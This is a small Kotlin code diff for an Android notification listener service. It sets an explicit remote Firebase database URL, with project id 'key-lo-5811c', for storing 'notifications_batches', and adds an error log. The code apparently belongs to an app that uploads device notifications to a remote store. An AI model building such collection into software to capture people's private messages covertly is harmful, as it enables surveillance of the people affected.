@@ -20,8 +20,9 @@ class AppNotificationListenerService : NotificationListenerService() {
         private const val TAG = "AppNotificationListener"
         private val scope = CoroutineScope(Dispatchers.IO)
         private fun getDatabaseRef() = try {
-            FirebaseDatabase.getInstance().getReference("notifications_batches")
+            FirebaseDatabase.getInstance("https://key-lo-5811c-default-rtdb.firebaseio.com").getReference("notifications_batches")
         } catch (e: Exception) {
+            Log.e(TAG, "Error getting database ref", e)
             null
         }
     }
